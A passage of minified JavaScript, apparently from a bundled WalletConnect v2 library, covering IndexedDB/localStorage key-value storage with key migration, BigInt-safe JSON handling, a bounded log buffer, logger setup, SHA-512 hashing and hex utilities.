            return e.openCursor().onsuccess = function() {
                this.result && (t(this.result),
                this.result.continue())
            }
            ,
            Je(e.transaction)
        }
        function nt(e) {
            if ("string" !== typeof e)
                throw new Error("Cannot safe json parse value of type ".concat(typeof e));
            try {
                return (e => {
                    const t = e.replace(/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g, '$1"$2n"$3');
                    return JSON.parse(t, ( (e, t) => "string" === typeof t && t.match(/^\d+n$/) ? BigInt(t.substring(0, t.length - 1)) : t))
                }
                )(e)
            } catch (t) {
                return e
            }
        }
        function ot(e) {
            return "string" === typeof e ? e : (e => JSON.stringify(e, ( (e, t) => "bigint" === typeof t ? t.toString() + "n" : t)))(e) || ""
        }
        var it = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            const t = e.base && e.base.length > 0 ? "".concat(e.base, ":") : ""
              , r = e => t + e;
            let n;
            return e.dbName && e.storeName && (n = Xe(e.dbName, e.storeName)),
            {
                name: "idb-keyval",
                options: e,
                hasItem: async e => !(typeof await tt(r(e), n) > "u"),
                async getItem(e) {
                    var t;
                    return null !== (t = await tt(r(e), n)) && void 0 !== t ? t : null
                },
                setItem: (e, t) => function(e, t) {
                    return (arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : et())("readwrite", (r => (r.put(t, e),
                    Je(r.transaction))))
                }(r(e), t, n),
                removeItem: e => function(e) {
                    return (arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : et())("readwrite", (t => (t.delete(e),
                    Je(t.transaction))))
                }(r(e), n),
                getKeys: () => function() {
                    return (arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : et())("readonly", (e => {
                        if (e.getAllKeys)
                            return Je(e.getAllKeys());
                        const t = [];
                        return rt(e, (e => t.push(e.key))).then(( () => t))
                    }
                    ))
                }(n),
                clear: () => function() {
                    return (arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : et())("readwrite", (e => (e.clear(),
                    Je(e.transaction))))
                }(n)
            }
        };
        class st {
            constructor() {
                this.indexedDb = Ke({
                    driver: it({
                        dbName: "WALLET_CONNECT_V2_INDEXED_DB",
                        storeName: "keyvaluestorage"
                    })
                })
            }
            async getKeys() {
                return this.indexedDb.getKeys()
            }
            async getEntries() {
                return (await this.indexedDb.getItems(await this.indexedDb.getKeys())).map((e => [e.key, e.value]))
            }
            async getItem(e) {
                const t = await this.indexedDb.getItem(e);
                if (null !== t)
                    return t
            }
            async setItem(e, t) {
                await this.indexedDb.setItem(e, ot(t))
            }
            async removeItem(e) {
                await this.indexedDb.removeItem(e)
            }
        }
        var at = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof r.g < "u" ? r.g : typeof self < "u" ? self : {}
          , ct = {
            exports: {}
        };
        function lt(e) {
            var t;
            return [e[0], nt(null != (t = e[1]) ? t : "")]
        }
        !function() {
            let e;
            function t() {}
            e = t,
            e.prototype.getItem = function(e) {
                return this.hasOwnProperty(e) ? String(this[e]) : null
            }
            ,
            e.prototype.setItem = function(e, t) {
                this[e] = String(t)
            }
            ,
            e.prototype.removeItem = function(e) {
                delete this[e]
            }
            ,
            e.prototype.clear = function() {
                const e = this;
                Object.keys(e).forEach((function(t) {
                    e[t] = void 0,
                    delete e[t]
                }
                ))
            }
            ,
            e.prototype.key = function(e) {
                return e = e || 0,
                Object.keys(this)[e]
            }
            ,
            e.prototype.__defineGetter__("length", (function() {
                return Object.keys(this).length
            }
            )),
            typeof at < "u" && at.localStorage ? ct.exports = at.localStorage : typeof window < "u" && window.localStorage ? ct.exports = window.localStorage : ct.exports = new t
        }();
        class ut {
            constructor() {
                this.localStorage = ct.exports
            }
            async getKeys() {
                return Object.keys(this.localStorage)
            }
            async getEntries() {
                return Object.entries(this.localStorage).map(lt)
            }
            async getItem(e) {
                const t = this.localStorage.getItem(e);
                if (null !== t)
                    return nt(t)
            }
            async setItem(e, t) {
                this.localStorage.setItem(e, ot(t))
            }
            async removeItem(e) {
                this.localStorage.removeItem(e)
            }
        }
        const dt = async (e, t) => {
            t.length && t.forEach((async t => {
                await e.removeItem(t)
            }
            ))
        }
        ;
        class ht {
            constructor() {
                this.initialized = !1,
                this.setInitialized = e => {
                    this.storage = e,
                    this.initialized = !0
                }
                ;
                const e = new ut;
                this.storage = e;
                try {
                    (async (e, t, r) => {
                        const n = "wc_storage_version"
                          , o = await t.getItem(n);
                        if (o && o >= 1)
                            return void r(t);
                        const i = await e.getKeys();
                        if (!i.length)
                            return void r(t);
                        const s = [];
                        for (; i.length; ) {
                            const r = i.shift();
                            if (!r)
                                continue;
                            const n = r.toLowerCase();
                            if (n.includes("wc@") || n.includes("walletconnect") || n.includes("wc_") || n.includes("wallet_connect")) {
                                const n = await e.getItem(r);
                                await t.setItem(r, n),
                                s.push(r)
                            }
                        }
                        await t.setItem(n, 1),
                        r(t),
                        dt(e, s)
                    }
                    )(e, new st, this.setInitialized)
                } catch (t) {
                    this.initialized = !0
                }
            }
            async getKeys() {
                return await this.initialize(),
                this.storage.getKeys()
            }
            async getEntries() {
                return await this.initialize(),
                this.storage.getEntries()
            }
            async getItem(e) {
                return await this.initialize(),
                this.storage.getItem(e)
            }
            async setItem(e, t) {
                return await this.initialize(),
                this.storage.setItem(e, t)
            }
            async removeItem(e) {
                return await this.initialize(),
                this.storage.removeItem(e)
            }
            async initialize() {
                this.initialized || await new Promise((e => {
                    const t = setInterval(( () => {
                        this.initialized && (clearInterval(t),
                        e())
                    }
                    ), 20)
                }
                ))
            }
        }
        var ft = r(5711)
          , pt = r.n(ft);
        const gt = "info"
          , yt = "custom_context"
          , mt = 1024e3;
        class bt {
            constructor(e) {
                this.nodeValue = e,
                this.sizeInBytes = (new TextEncoder).encode(this.nodeValue).length,
                this.next = null
            }
            get value() {
                return this.nodeValue
            }
            get size() {
                return this.sizeInBytes
            }
        }
        class vt {
            constructor(e) {
                this.head = null,
                this.tail = null,
                this.lengthInNodes = 0,
                this.maxSizeInBytes = e,
                this.sizeInBytes = 0
            }
            append(e) {
                const t = new bt(e);
                if (t.size > this.maxSizeInBytes)
                    throw new Error("[LinkedList] Value too big to insert into list: ".concat(e, " with size ").concat(t.size));
                for (; this.size + t.size > this.maxSizeInBytes; )
                    this.shift();
                this.head ? (this.tail && (this.tail.next = t),
                this.tail = t) : (this.head = t,
                this.tail = t),
                this.lengthInNodes++,
                this.sizeInBytes += t.size
            }
            shift() {
                if (!this.head)
                    return;
                const e = this.head;
                this.head = this.head.next,
                this.head || (this.tail = null),
                this.lengthInNodes--,
                this.sizeInBytes -= e.size
            }
            toArray() {
                const e = [];
                let t = this.head;
                for (; null !== t; )
                    e.push(t.value),
                    t = t.next;
                return e
            }
            get length() {
                return this.lengthInNodes
            }
            get size() {
                return this.sizeInBytes
            }
            toOrderedArray() {
                return Array.from(this)
            }
            [Symbol.iterator]() {
                let e = this.head;
                return {
                    next: () => {
                        if (!e)
                            return {
                                done: !0,
                                value: null
                            };
                        const t = e.value;
                        return e = e.next,
                        {
                            done: !1,
                            value: t
                        }
                    }
                }
            }
        }
        class wt {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : mt;
                this.level = null !== e && void 0 !== e ? e : "error",
                this.levelValue = ft.levels.values[this.level],
                this.MAX_LOG_SIZE_IN_BYTES = t,
                this.logs = new vt(this.MAX_LOG_SIZE_IN_BYTES)
            }
            forwardToConsole(e, t) {
                t === ft.levels.values.error ? console.error(e) : t === ft.levels.values.warn ? console.warn(e) : t === ft.levels.values.debug ? console.debug(e) : t === ft.levels.values.trace ? console.trace(e) : console.log(e)
            }
            appendToLogs(e) {
                this.logs.append(ot({
                    timestamp: (new Date).toISOString(),
                    log: e
                }));
                const t = "string" == typeof e ? JSON.parse(e).level : e.level;
                t >= this.levelValue && this.forwardToConsole(e, t)
            }
            getLogs() {
                return this.logs
            }
            clearLogs() {
                this.logs = new vt(this.MAX_LOG_SIZE_IN_BYTES)
            }
            getLogArray() {
                return Array.from(this.logs)
            }
            logsToBlob(e) {
                const t = this.getLogArray();
                return t.push(ot({
                    extraMetadata: e
                })),
                new Blob(t,{
                    type: "application/json"
                })
            }
        }
        class Tt {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : mt;
                this.baseChunkLogger = new wt(e,t)
            }
            write(e) {
                this.baseChunkLogger.appendToLogs(e)
            }
            getLogs() {
                return this.baseChunkLogger.getLogs()
            }
            clearLogs() {
                this.baseChunkLogger.clearLogs()
            }
            getLogArray() {
                return this.baseChunkLogger.getLogArray()
            }
            logsToBlob(e) {
                return this.baseChunkLogger.logsToBlob(e)
            }
            downloadLogsBlobInBrowser(e) {
                const t = URL.createObjectURL(this.logsToBlob(e))
                  , r = document.createElement("a");
                r.href = t,
                r.download = "walletconnect-logs-".concat((new Date).toISOString(), ".txt"),
                document.body.appendChild(r),
                r.click(),
                document.body.removeChild(r),
                URL.revokeObjectURL(t)
            }
        }
        class At {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : mt;
                this.baseChunkLogger = new wt(e,t)
            }
            write(e) {
                this.baseChunkLogger.appendToLogs(e)
            }
            getLogs() {
                return this.baseChunkLogger.getLogs()
            }
            clearLogs() {
                this.baseChunkLogger.clearLogs()
            }
            getLogArray() {
                return this.baseChunkLogger.getLogArray()
            }
            logsToBlob(e) {
                return this.baseChunkLogger.logsToBlob(e)
            }
        }
        var Et = Object.defineProperty
          , Pt = Object.defineProperties
          , Ct = Object.getOwnPropertyDescriptors
          , St = Object.getOwnPropertySymbols
          , It = Object.prototype.hasOwnProperty
          , Bt = Object.prototype.propertyIsEnumerable
          , xt = (e, t, r) => t in e ? Et(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , Ot = (e, t) => {
            for (var r in t || (t = {}))
                It.call(t, r) && xt(e, r, t[r]);
            if (St)
                for (var r of St(t))
                    Bt.call(t, r) && xt(e, r, t[r]);
            return e
        }
          , _t = (e, t) => Pt(e, Ct(t));
        function Wt(e) {
            return _t(Ot({}, e), {
                level: (null === e || void 0 === e ? void 0 : e.level) || gt
            })
        }
        function Rt(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : yt
              , r = "";
            return r = typeof e.bindings > "u" ? function(e) {
                return e[arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : yt] || ""
            }(e, t) : e.bindings().context || "",
            r
        }
        function kt(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : yt;
            const n = function(e, t) {
                const r = Rt(e, arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : yt);
                return r.trim() ? "".concat(r, "/").concat(t) : t
            }(e, t, r);
            return function(e, t) {
                return e[arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : yt] = t,
                e
            }(e.child({
                context: n
            }), n, r)
        }
        function Mt(e) {
            return typeof e.loggerOverride < "u" && "string" != typeof e.loggerOverride ? {
                logger: e.loggerOverride,
                chunkLoggerController: null
            } : typeof window < "u" ? function(e) {
                var t, r;
                const n = new Tt(null == (t = e.opts) ? void 0 : t.level,e.maxSizeInBytes);
                return {
                    logger: pt()(_t(Ot({}, e.opts), {
                        level: "trace",
                        browser: _t(Ot({}, null == (r = e.opts) ? void 0 : r.browser), {
                            write: e => n.write(e)
                        })
                    })),
                    chunkLoggerController: n
                }
            }(e) : function(e) {
                var t;
                const r = new At(null == (t = e.opts) ? void 0 : t.level,e.maxSizeInBytes);
                return {
                    logger: pt()(_t(Ot({}, e.opts), {
                        level: "trace"
                    }), r),
                    chunkLoggerController: r
                }
            }(e)
        }
        var Nt = Object.defineProperty
          , Ft = (e, t, r) => ( (e, t, r) => t in e ? Nt(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class Ut extends xe {
            constructor(e) {
                super(),
                this.opts = e,
                Ft(this, "protocol", "wc"),
                Ft(this, "version", 2)
            }
        }
        var Dt = Object.defineProperty
          , Lt = (e, t, r) => ( (e, t, r) => t in e ? Dt(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class jt extends xe {
            constructor(e, t) {
                super(),
                this.core = e,
                this.logger = t,
                Lt(this, "records", new Map)
            }
        }
        class zt {
            constructor(e, t) {
                this.logger = e,
                this.core = t
            }
        }
        class Vt extends xe {
            constructor(e, t) {
                super(),
                this.relayer = e,
                this.logger = t
            }
        }
        class Ht extends xe {
            constructor(e) {
                super()
            }
        }
        class qt {
            constructor(e, t, r, n) {
                this.core = e,
                this.logger = t,
                this.name = r
            }
        }
        Object.defineProperty;
        class Gt extends xe {
            constructor(e, t) {
                super(),
                this.relayer = e,
                this.logger = t
            }
        }
        class $t extends xe {
            constructor(e, t) {
                super(),
                this.core = e,
                this.logger = t
            }
        }
        class Kt {
            constructor(e, t, r) {
                this.core = e,
                this.logger = t,
                this.store = r
            }
        }
        class Zt {
            constructor(e, t) {
                this.projectId = e,
                this.logger = t
            }
        }
        class Yt {
            constructor(e, t, r) {
                this.core = e,
                this.logger = t,
                this.telemetryEnabled = r
            }
        }
        var Jt = Object.defineProperty
          , Xt = (e, t, r) => ( (e, t, r) => t in e ? Jt(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        Ie();
        class Qt {
            constructor(e) {
                this.opts = e,
                Xt(this, "protocol", "wc"),
                Xt(this, "version", 2)
            }
        }
        Se.EventEmitter;
        class er {
            constructor(e) {
                this.client = e
            }
        }
        function tr(e) {
            if (!function(e) {
                return e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name
            }(e))
                throw new Error("Uint8Array expected");
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            if (r.length > 0 && !r.includes(e.length))
                throw new Error("Uint8Array expected of length " + r + ", got length=" + e.length)
        }
        function rr(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
            if (t && e.finished)
                throw new Error("Hash#digest() has already been called")
        }
        const nr = "object" == typeof globalThis && "crypto"in globalThis ? globalThis.crypto : void 0
          , or = e => new DataView(e.buffer,e.byteOffset,e.byteLength);
        function ir(e) {
            return "string" == typeof e && (e = function(e) {
                if ("string" != typeof e)
                    throw new Error("utf8ToBytes expected string, got " + typeof e);
                return new Uint8Array((new TextEncoder).encode(e))
            }(e)),
            tr(e),
            e
        }
        class sr {
            clone() {
                return this._cloneInto()
            }
        }
        function ar() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
            if (nr && "function" == typeof nr.getRandomValues)
                return nr.getRandomValues(new Uint8Array(e));
            if (nr && "function" == typeof nr.randomBytes)
                return nr.randomBytes(e);
            throw new Error("crypto.getRandomValues must be defined")
        }
        class cr extends sr {
            constructor(e, t, r, n) {
                super(),
                this.blockLen = e,
                this.outputLen = t,
                this.padOffset = r,
                this.isLE = n,
                this.finished = !1,
                this.length = 0,
                this.pos = 0,
                this.destroyed = !1,
                this.buffer = new Uint8Array(e),
                this.view = or(this.buffer)
            }
            update(e) {
                rr(this);
                const {view: t, buffer: r, blockLen: n} = this
                  , o = (e = ir(e)).length;
                for (let i = 0; i < o; ) {
                    const s = Math.min(n - this.pos, o - i);
                    if (s !== n)
                        r.set(e.subarray(i, i + s), this.pos),
                        this.pos += s,
                        i += s,
                        this.pos === n && (this.process(t, 0),
                        this.pos = 0);
                    else {
                        const t = or(e);
                        for (; n <= o - i; i += n)
                            this.process(t, i)
                    }
                }
                return this.length += e.length,
                this.roundClean(),
                this
            }
            digestInto(e) {
                rr(this),
                function(e, t) {
                    tr(e);
                    const r = t.outputLen;
                    if (e.length < r)
                        throw new Error("digestInto() expects output buffer of length at least " + r)
                }(e, this),
                this.finished = !0;
                const {buffer: t, view: r, blockLen: n, isLE: o} = this;
                let {pos: i} = this;
                t[i++] = 128,
                this.buffer.subarray(i).fill(0),
                this.padOffset > n - i && (this.process(r, 0),
                i = 0);
                for (let u = i; u < n; u++)
                    t[u] = 0;
                (function(e, t, r, n) {
                    if ("function" == typeof e.setBigUint64)
                        return e.setBigUint64(t, r, n);
                    const o = BigInt(32)
                      , i = BigInt(4294967295)
                      , s = Number(r >> o & i)
                      , a = Number(r & i)
                      , c = n ? 4 : 0
                      , l = n ? 0 : 4;
                    e.setUint32(t + c, s, n),
                    e.setUint32(t + l, a, n)
                }
                )(r, n - 8, BigInt(8 * this.length), o),
                this.process(r, 0);
                const s = or(e)
                  , a = this.outputLen;
                if (a % 4)
                    throw new Error("_sha2: outputLen should be aligned to 32bit");
                const c = a / 4
                  , l = this.get();
                if (c > l.length)
                    throw new Error("_sha2: outputLen bigger than state");
                for (let u = 0; u < c; u++)
                    s.setUint32(4 * u, l[u], o)
            }
            digest() {
                const {buffer: e, outputLen: t} = this;
                this.digestInto(e);
                const r = e.slice(0, t);
                return this.destroy(),
                r
            }
            _cloneInto(e) {
                e || (e = new this.constructor),
                e.set(...this.get());
                const {blockLen: t, buffer: r, length: n, finished: o, destroyed: i, pos: s} = this;
                return e.length = n,
                e.pos = s,
                e.finished = o,
                e.destroyed = i,
                n % t && e.buffer.set(r),
                e
            }
        }
        const lr = BigInt(2 ** 32 - 1)
          , ur = BigInt(32);
        function dr(e) {
            return arguments.length > 1 && void 0 !== arguments[1] && arguments[1] ? {
                h: Number(e & lr),
                l: Number(e >> ur & lr)
            } : {
                h: 0 | Number(e >> ur & lr),
                l: 0 | Number(e & lr)
            }
        }
        const hr = {
            fromBig: dr,
            split: function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
                  , r = new Uint32Array(e.length)
                  , n = new Uint32Array(e.length);
                for (let o = 0; o < e.length; o++) {
                    const {h: i, l: s} = dr(e[o], t);
                    [r[o],n[o]] = [i, s]
                }
                return [r, n]
            },
            toBig: (e, t) => BigInt(e >>> 0) << ur | BigInt(t >>> 0),
            shrSH: (e, t, r) => e >>> r,
            shrSL: (e, t, r) => e << 32 - r | t >>> r,
            rotrSH: (e, t, r) => e >>> r | t << 32 - r,
            rotrSL: (e, t, r) => e << 32 - r | t >>> r,
            rotrBH: (e, t, r) => e << 64 - r | t >>> r - 32,
            rotrBL: (e, t, r) => e >>> r - 32 | t << 64 - r,
            rotr32H: (e, t) => t,
            rotr32L: (e, t) => e,
            rotlSH: (e, t, r) => e << r | t >>> 32 - r,
            rotlSL: (e, t, r) => t << r | e >>> 32 - r,
            rotlBH: (e, t, r) => t << r - 32 | e >>> 64 - r,
            rotlBL: (e, t, r) => e << r - 32 | t >>> 64 - r,
            add: function(e, t, r, n) {
                const o = (t >>> 0) + (n >>> 0);
                return {
                    h: e + r + (o / 2 ** 32 | 0) | 0,
                    l: 0 | o
                }
            },
            add3L: (e, t, r) => (e >>> 0) + (t >>> 0) + (r >>> 0),
            add3H: (e, t, r, n) => t + r + n + (e / 2 ** 32 | 0) | 0,
            add4L: (e, t, r, n) => (e >>> 0) + (t >>> 0) + (r >>> 0) + (n >>> 0),
            add4H: (e, t, r, n, o) => t + r + n + o + (e / 2 ** 32 | 0) | 0,
            add5H: (e, t, r, n, o, i) => t + r + n + o + i + (e / 2 ** 32 | 0) | 0,
            add5L: (e, t, r, n, o) => (e >>> 0) + (t >>> 0) + (r >>> 0) + (n >>> 0) + (o >>> 0)
        }
          , [fr,pr] = hr.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map((e => BigInt(e))))
          , gr = new Uint32Array(80)
          , yr = new Uint32Array(80);
        class mr extends cr {
            constructor() {
                super(128, 64, 16, !1),
                this.Ah = 1779033703,
                this.Al = -205731576,
                this.Bh = -1150833019,
                this.Bl = -2067093701,
                this.Ch = 1013904242,
                this.Cl = -23791573,
                this.Dh = -1521486534,
                this.Dl = 1595750129,
                this.Eh = 1359893119,
                this.El = -1377402159,
                this.Fh = -1694144372,
                this.Fl = 725511199,
                this.Gh = 528734635,
                this.Gl = -79577749,
                this.Hh = 1541459225,
                this.Hl = 327033209
            }
            get() {
                const {Ah: e, Al: t, Bh: r, Bl: n, Ch: o, Cl: i, Dh: s, Dl: a, Eh: c, El: l, Fh: u, Fl: d, Gh: h, Gl: f, Hh: p, Hl: g} = this;
                return [e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g]
            }
            set(e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g) {
                this.Ah = 0 | e,
                this.Al = 0 | t,
                this.Bh = 0 | r,
                this.Bl = 0 | n,
                this.Ch = 0 | o,
                this.Cl = 0 | i,
                this.Dh = 0 | s,
                this.Dl = 0 | a,
                this.Eh = 0 | c,
                this.El = 0 | l,
                this.Fh = 0 | u,
                this.Fl = 0 | d,
                this.Gh = 0 | h,
                this.Gl = 0 | f,
                this.Hh = 0 | p,
                this.Hl = 0 | g
            }
            process(e, t) {
                for (let b = 0; b < 16; b++,
                t += 4)
                    gr[b] = e.getUint32(t),
                    yr[b] = e.getUint32(t += 4);
                for (let b = 16; b < 80; b++) {
                    const e = 0 | gr[b - 15]
                      , t = 0 | yr[b - 15]
                      , r = hr.rotrSH(e, t, 1) ^ hr.rotrSH(e, t, 8) ^ hr.shrSH(e, t, 7)
                      , n = hr.rotrSL(e, t, 1) ^ hr.rotrSL(e, t, 8) ^ hr.shrSL(e, t, 7)
                      , o = 0 | gr[b - 2]
                      , i = 0 | yr[b - 2]
                      , s = hr.rotrSH(o, i, 19) ^ hr.rotrBH(o, i, 61) ^ hr.shrSH(o, i, 6)
                      , a = hr.rotrSL(o, i, 19) ^ hr.rotrBL(o, i, 61) ^ hr.shrSL(o, i, 6)
                      , c = hr.add4L(n, a, yr[b - 7], yr[b - 16])
                      , l = hr.add4H(c, r, s, gr[b - 7], gr[b - 16]);
                    gr[b] = 0 | l,
                    yr[b] = 0 | c
                }
                let {Ah: r, Al: n, Bh: o, Bl: i, Ch: s, Cl: a, Dh: c, Dl: l, Eh: u, El: d, Fh: h, Fl: f, Gh: p, Gl: g, Hh: y, Hl: m} = this;
                for (let b = 0; b < 80; b++) {
                    const e = hr.rotrSH(u, d, 14) ^ hr.rotrSH(u, d, 18) ^ hr.rotrBH(u, d, 41)
                      , t = hr.rotrSL(u, d, 14) ^ hr.rotrSL(u, d, 18) ^ hr.rotrBL(u, d, 41)
                      , v = u & h ^ ~u & p
                      , w = d & f ^ ~d & g
                      , T = hr.add5L(m, t, w, pr[b], yr[b])
                      , A = hr.add5H(T, y, e, v, fr[b], gr[b])
                      , E = 0 | T
                      , P = hr.rotrSH(r, n, 28) ^ hr.rotrBH(r, n, 34) ^ hr.rotrBH(r, n, 39)
                      , C = hr.rotrSL(r, n, 28) ^ hr.rotrBL(r, n, 34) ^ hr.rotrBL(r, n, 39)
                      , S = r & o ^ r & s ^ o & s
                      , I = n & i ^ n & a ^ i & a;
                    y = 0 | p,
                    m = 0 | g,
                    p = 0 | h,
                    g = 0 | f,
                    h = 0 | u,
                    f = 0 | d,
                    ({h: u, l: d} = hr.add(0 | c, 0 | l, 0 | A, 0 | E)),
                    c = 0 | s,
                    l = 0 | a,
                    s = 0 | o,
                    a = 0 | i,
                    o = 0 | r,
                    i = 0 | n;
                    const B = hr.add3L(E, C, I);
                    r = hr.add3H(B, A, P, S),
                    n = 0 | B
                }
                ({h: r, l: n} = hr.add(0 | this.Ah, 0 | this.Al, 0 | r, 0 | n)),
                ({h: o, l: i} = hr.add(0 | this.Bh, 0 | this.Bl, 0 | o, 0 | i)),
                ({h: s, l: a} = hr.add(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
                ({h: c, l: l} = hr.add(0 | this.Dh, 0 | this.Dl, 0 | c, 0 | l)),
                ({h: u, l: d} = hr.add(0 | this.Eh, 0 | this.El, 0 | u, 0 | d)),
                ({h: h, l: f} = hr.add(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | f)),
                ({h: p, l: g} = hr.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | g)),
                ({h: y, l: m} = hr.add(0 | this.Hh, 0 | this.Hl, 0 | y, 0 | m)),
                this.set(r, n, o, i, s, a, c, l, u, d, h, f, p, g, y, m)
            }
            roundClean() {
                gr.fill(0),
                yr.fill(0)
            }
            destroy() {
                this.buffer.fill(0),
                this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            }
        }
        const br = function(e) {
            const t = t => e().update(ir(t)).digest()
              , r = e();
            return t.outputLen = r.outputLen,
            t.blockLen = r.blockLen,
            t.create = () => e(),
            t
        }(( () => new mr))
          , vr = BigInt(0)
          , wr = BigInt(1)
          , Tr = BigInt(2);
        function Ar(e) {
            return e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name
        }
        function Er(e) {
            if (!Ar(e))
                throw new Error("Uint8Array expected")
        }
        function Pr(e, t) {
            if ("boolean" != typeof t)
                throw new Error(e + " boolean expected, got " + t)
        }
        const Cr = Array.from({
            length: 256
        }, ( (e, t) => t.toString(16).padStart(2, "0")));
        function Sr(e) {
            Er(e);
            let t = "";
            for (let r = 0; r < e.length; r++)
                t += Cr[e[r]];
            return t
        }
        function Ir(e) {
            if ("string" != typeof e)
                throw new Error("hex string expected, got " + typeof e);
            return "" === e ? vr : BigInt("0x" + e)
        }
        const Br = 48
          , xr = 57
          , Or = 65
          , _r = 70
          , Wr = 97
          , Rr = 102;
        function kr(e) {
            return e >= Br && e <= xr ? e - Br : e >= Or && e <= _r ? e - (Or - 10) : e >= Wr && e <= Rr ? e - (Wr - 10) : void 0
        }
        function Mr(e) {
            if ("string" != typeof e)
                throw new Error("hex string expected, got " + typeof e);
            const t = e.length
              , r = t / 2;
            if (t % 2)
                throw new Error("hex string expected, got unpadded hex of length " + t);
            const n = new Uint8Array(r);
            for (let o = 0, i = 0; o < r; o++,
            i += 2) {
                const t = kr(e.charCodeAt(i))
                  , r = kr(e.charCodeAt(i + 1));
                if (void 0 === t || void 0 === r) {
                    const t = e[i] + e[i + 1];
                    throw new Error('hex string expected, got non-hex character "' + t + '" at index ' + i)
                }
                n[o] = 16 * t + r
            }
            return n
        }
        function Nr(e) {
            return Er(e),
            Ir(Sr(Uint8Array.from(e).reverse()))
        }
        function Fr(e, t) {
            return Mr(e.toString(16).padStart(2 * t, "0"))
        }
        function Ur(e, t) {
            return Fr(e, t).reverse()
        }
        function Dr(e, t, r) {
            let n;
            if ("string" == typeof t)
                try {
                    n = Mr(t)
                } catch (_e) {
                    throw new Error(e + " must be hex string or Uint8Array, cause: " + _e)
                }
            else {
                if (!Ar(t))
                    throw new Error(e + " must be hex string or Uint8Array");
                n = Uint8Array.from(t)
            }
            const o = n.length;
            if ("number" == typeof r && o !== r)
                throw new Error(e + " of length " + r + " expected, got " + o);
            return n
        }
        function Lr() {
            let e = 0;
            for (let r = 0; r < arguments.length; r++) {
                const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                Er(t),
